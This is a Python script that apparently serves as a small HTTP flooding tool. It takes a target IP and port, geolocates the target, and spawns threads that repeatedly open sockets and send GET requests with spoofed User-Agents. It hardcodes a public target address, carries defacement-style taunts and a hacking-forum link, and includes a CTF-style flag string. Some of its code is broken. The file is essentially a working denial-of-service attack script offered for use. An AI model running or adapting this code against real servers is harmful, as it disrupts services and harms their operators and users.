#!/usr/bin/env python3
#
hello = """
                                                                      
        .uef^"                                                        
      :d88E                      u.    u.      u.    u.               
      `888E             u      x@88k u@88c.  x@88k u@88c.       u     
       888E .z8k     us888u.  ^"8888""8888" ^"8888""8888"    us888u.  
       888E~?888L .@88 "8888"   8888  888R    8888  888R  .@88 "8888" 
       888E  888E 9888  9888    8888  888R    8888  888R  9888  9888  
       888E  888E 9888  9888    8888  888R    8888  888R  9888  9888  
       888E  888E 9888  9888    8888  888R    8888  888R  9888  9888  
       888E  888E 9888  9888   "*88*" 8888"  "*88*" 8888" 9888  9888  
      m888N= 888> "888*""888"    ""   'Y"      ""   'Y"   "888*""888" 
       `Y"   888   ^Y"   ^Y'                               ^Y"   ^Y'  
            J88"                                                      
            @%                                                        
          :"                                                          
"""
import datetime, os, platform, socket, sys, uuid
import hashlib, json, requests, threading
from threading import Timer

import time
# RAW

hil = """
GET / HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
>> Host, User-Agent, Accept, Accept-Encoding, Connection

num = send(s, addr_of_data, len_of_data, 0);
num = recv(s, addr_of_buffer, len_of_buffer, 0);
Content-Type: text/plain
"""
workstation = "Hanna Sofea's comrade";
w1 = '\tLOCKED OUT OF SERVER; kwafeLt wAS hERE..'
w2 = '\thttps://dragonforce.io/members/kwafelt.30011/'
w3 = '\thttps://www.instagram.com/kwafelt/?'

Browser_identification = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.80';
user_agent = Browser_identification; ps4 = 'WorkaroundCtl/1.00 libhttp/9.60 (PlayStation 4)';

localhost =  socket.gethostname(); address = socket.gethostbyname(localhost);
hostname = os.uname()[0]; username = os.environ.get('USERNAME');
admin = os.getlogin(); MAC = hex(uuid.getnode());
deact = 'writ.er.ws'; slEEp = 0.5

# parse_input
script = sys.argv[0]; none = ""; txt = none;
target = none; port = none; num_requests = 0;

def t1m3r():
 Timer(0.5,parse).start();

def parse():
 sa = len(sys.argv);
 if sa == 3:
  global target; global port;
  target = sys.argv[1]; port = sys.argv[2]; port = int(port);
  start();
 else:
  sys.stdout.write(f'\r\n Usage: {sys.argv[0]} < TARGET_IP > < PORT >');
  sys.stdout.write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 :80\n');
  sys.stdout.flush(); reset(0); sys.exit(1);

# scratch.py
#
REMOTE_SERVER = 'cloudflare.com'; remote = REMOTE_SERVER; STATE = True
TARGET_IP = '80.179.151.134'; TARGET_PORT = 443; status = 'mill'
#
#target = sys.argv[1]; port = sys.argv[2];
t4rg3t = '192.168.11.17'; p0rt = 5000;
#
# pAUSE




def test():
 s = "Hello World"
 s = s.replace("ld","Universe")
 print(s)

def colored(r,g,b,text):
 return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r,g,b,text);

def client(init): # platform
 client_os = platform.system(); un = platform.uname();
 client_hn = platform.node(); # hostname
 if init == 'os': return client_os;
 if init == 'hn': return client_hn;

b4L = 'process'; v4L = 'kwafeLt wAS hERE';
question = 'Do you want to continue?';
confirm = 'Is this ok?';

def terminal(init):
 if init == 'start': terminal_title = workstation + ' \ ' + v4L
 if init == 'process': terminal_title = 'Injecting \ ' + target + ': ' + str(port) + ' \ ' + v4L
 print(f'\33]0;{terminal_title}\a',end='',flush=True);

def h4sh(txt):
 str2hash = txt; result = hashlib.md5(str2hash.encode());
 digest = result.hexdigest(); return digest

def address(LAN):
 if LAN == 0:
  hostname = socket.gethostname() # getting the IP address using socket.gethostbyname() method
  ip_address = socket.gethostbyname(hostname) # getting the IP address using socket.gethostbyname() method
  addr = ip_address # print(f"Hostname: {hostname}") # print(f"IP Address: {ip_address}")
 if LAN == 1:
  wifi = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
  wifi.connect((remote_server,80)) # 443
  addr = wifi.getsockname()[0]
 return addr
 
def reset(init):
 os.system('setterm --foreground default --background default --cursor on');
 if init == 1:
  sys.stdout.write(f'\r\n .. stopping python3 {script} {target} {port}\r\n');
  sys.stdout.flush(); sys.stdout.write(f'\r\n .. T3R1M4 K4S3H ..\r\n\n');
  sys.stdout.flush(); sys.exit(1);

def start():
 terminal('start'); os.system('setterm --foreground black --background white --cursor on')
 os.system('clear'); print(hello); access_code('\taccess code');

def access_code(key):
 reply = input('\n ' + key + '\t:\t');
 if reply == '2022':
  os.system('setterm --foreground cyan --background black --cursor on'); os.system('clear');
  print('\n',colored(245,110,110,admin),colored(245,245,245,client('hn')),colored(245,110,110,MAC),colored(245,245,245,client('os')),end=' ');
  print(colored(0,110,210,platform.release()),'\n',colored(205,163,152,'wanna/will inject process to'),colored(245,110,110,target + ' : ' + str(port)),end='\n');
  
  ipinfo()
  
  yes_or_no(question);
 else:
  access_code('\ttry again');

def yes_or_no(question):
 reply = input('\n ' + question + ' [y/N] ');
 if reply == '' or reply[0] == 'n':
  global txt; txt = 'CANCEL'; reset(0); os.system('clear'); return False;
 if reply[0] == 'y': pre_start(); return False;
 else: return yes_or_no('so.. YES or NO ?');

def yes_or_no_ORIG(question): # BROKEN
 reply = str(raw_input(question + ' [y/N] ')).lower().strip();
 if reply[0] == 'y': return True
 if reply[0] == 'n': return False
 else: return yes_or_no("Uhhhh... please enter ");

def pre_start():
 os.system('setterm --cursor off');#os.system('clear');
 terminal('process'); verify();

###############################################################################

def ipinfo():
 uRL_ORI = 'https://ipinfo.io/json/1.1.1.1'
 uRL = 'http://ip-api.com/json/' + target
 response = requests.get(uRL)
 txt_resp = json.loads(response.text)
 # EDIT
# str1 = colored(210,110,0,txt_resp['ip'])
# str2 = colored(0,110,210,txt_resp['region'])
# str3 = colored(0,110,210,txt_resp['loc'])
# str4 = colored(205,163,152,txt_resp['org'])
# print('\n','IP',str1,'from',str2,'(' + str3 + ')','\n',str4)
 
 print(f'\n',txt_resp)

###############################################################################

def datetim4(init):
 global waktu
 from datetime import datetime
 waktu = datetime.now(); # current date and time
 if init == 0:
  strTIME = waktu.strftime('%y/%m/%d %H:%M:%S')
 if init == 1:
  strTIME = waktu.strftime('%f')
 if init == 2:
  day_of_year = waktu.timetuple().tm_yday # day_of_year
  strTIME = day_of_year
 return strTIME
 return waktu

thread_num = 0
# OK
def print_status(status, hexd):
 tim3 = datetim4(0)
 tim4 = datetim4(1)
 if status == 'success':
  str_1 = colored(205, 163, 152, tim3)
  str_2 = colored(45 , 145, 145, b4L)
  str_3 = colored(245, 110,  45, hexd)
  str_4 = colored(245, 245, 245, v4L)
  slEEp = 1.0; sys.stdout.write(f'\r {str_1} {str_2} {str_3} {str_4}\r\n');
  sys.stdout.flush(); return False;
 if status == 'failure':
  str_1 = colored(145, 145, 145, tim3);
  str_2 = colored(245, 110, 110, 'No connection > server may be down');
  str_3 = colored(205, 163, 152, '< RECONNECTING');
  str_4 = colored(245 , 245, 245, tim4);
  sys.stdout.write(f'\r\n {str_1} {str_2} {str_3} {str_4}\r');
  sys.stdout.flush();
 else:
  str_1 = colored(245,110,45,tim3);
  str_2 = colored(245,245,245,'!PAUSED');
  str_3 = colored(245,45,215,'You pressed CTRL + C / Program interrupted.');
  sys.stdout.write(f'\r\n {str_1} {str_2} {str_3}\r\n'); sys.stdout.flush();
  reset(0);
 return status

###############################################################################

def attack():
 global slEEp; status = 'IDLE'; t1m3 = datetim4(1); hexd = h4sh(t1m3);
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
  try:
   address = (target, port); proc.connect(address);
   proc.sendto(('GET /' + '?i=' + hexd + ' HTTP/1.1\r\nHost: ' + deact + '\r\n').encode('ascii'), address);
   proc.sendto(('User-Agent: ' + user_agent + '\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
   proc.sendto(('Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
   proc.sendto(('Keep-Alive: timeout=15, max=100\r\n\r\n').encode('ascii'), address);
   #
   # response = proc.recv(4096); #print('\r\n' + response.decode('ascii'))
   #
   proc.shutdown(socket.SHUT_RDWR); proc.close();
   slEEp = 0.05; status = 'success'; # print_status('success', hexd);
  except socket.error:
   slEEp = 1.00; status = 'failure'; # print_status('failure', hexd);
  except (IOError, OSError):
   slEEp = 3.00; status = 'OSError'; hexd = 'dalam socket';
  except (KeyboardInterrupt, SystemExit):
   status = 'numb'; print('\r\n','..EXIT');
  finally:
   print_status(status, hexd);# Timer(slEEp,process).start();
   #process();
   # num = send(s, addr_of_data, len_of_data, 0);
   # num = recv(s, addr_of_buffer, len_of_buffer, 0);
 return slEEp;

def process():
 try:
  for i in range(10):# 500
   time.sleep(slEEp);
   thread = threading.Thread(target=attack);
   thread.start();
 except (IOError, OSError):
  print('OSError');
 except (KeyboardInterrupt, SystemExit):
  time.sleep(0.5); global txt; txt = '.. CTRL-C / PRESSED';
  reset(0);

def process_steady():
 i = 1;
 while (i < 540000):
  process();# attack();
  if (i == 3):
   time.sleep(0.5)
   global txt; txt = '.. FINN / CTF{h4nn4_s0f34}';
   reset(0); break
  i += 1

def verify():
 try:
  r = socket.gethostbyname(target);
  s = socket.create_connection((r, port), 2)
  process_steady();
 except (IOError, OSError):
  global txt; txt = '.. SYSTEM LOCKDOWN / SERVER OFFLINE';
  reset(0);
 except (KeyboardInterrupt, SystemExit):
  reset(0);

###############################################################################

try: parse(); reset(0);
except (IOError, OSError): print('main_OSError');
except (KeyboardInterrupt, SystemExit): sys.stdout.write(f'\r\n {txt}\r\n'); sys.stdout.flush();
finally: reset(1); test(); sys.exit(0);
# TERIMA KASEH~
